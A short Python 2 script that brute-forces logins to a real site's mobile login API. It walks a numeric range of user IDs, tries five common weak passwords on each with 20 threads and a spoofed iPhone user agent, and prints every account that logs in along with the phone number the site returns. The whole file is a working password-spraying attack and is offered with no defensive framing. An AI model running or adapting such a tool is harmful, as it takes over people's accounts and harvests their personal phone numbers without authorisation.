#!/usr/bin/env python

#2015-09-02
#joeyxy83@gmail.com
#for check the user

import requests
import threadpool as tp
import json
import sys
import argparse
import hashlib

class xmjx_crawler(object):

	def __init__(self,sid,eid):
		self.sid = sid
		self.eid = eid

	def start(self):	
		args=[]
		for i in range(self.sid,self.eid):
			args.append(i)
		pool = tp.ThreadPool(20)
		reqs = tp.makeRequests(check,args)
		[pool.putRequest(req) for req in reqs]
		pool.wait()

def check(args):
	for pwd in ['888888','000000','666666','111111','88888888']:
		key = hashlib.sha256(pwd).hexdigest()
		phone = args
		data = {'id_type':'1',
		'phone':phone,
		'device':'2',
		'pass':key,
		'version':'1.8',
		}
		headers = {'content-type':'application/x-www-form-urlencoded; charset=utf-8',
		'User-Agent':'1.8 rv:1.8.5 (iPhone; iPhone OS 8.4; zh_CN)',}
		api_url = 'http://www.xmxing.net/panda_api_new/login.php'
		try:
			req = requests.post(api_url,data=data,headers=headers,timeout=3)
			req_status = json.loads(req.content)['state']
		except requests.RequestException as e:
			print "login error:%s" % e

		if req_status == 'true':
			mobile = json.loads(req.content)['sjhm']
			print "login ok,id:%s,mobile:%s,pass:%s" % (phone,mobile,pwd)
			break
		else:
			pass
			#msg = json.loads(req.content)['msg']
			#print "fail:%s,id:%s,pass:%s" % (msg,phone,pwd)


if __name__ == '__main__':
	parser = argparse.ArgumentParser(description="test for id")
	parser.add_argument('--startid',action="store",dest="startid",type=int,default='21375700')
	parser.add_argument('--endid',action="store",dest="endid",type=int,default='21376920')
	given_args = parser.parse_args()
	startid = given_args.startid
	endid = given_args.endid

	burp = xmjx_crawler(sid=startid,eid=endid)
	burp.start()

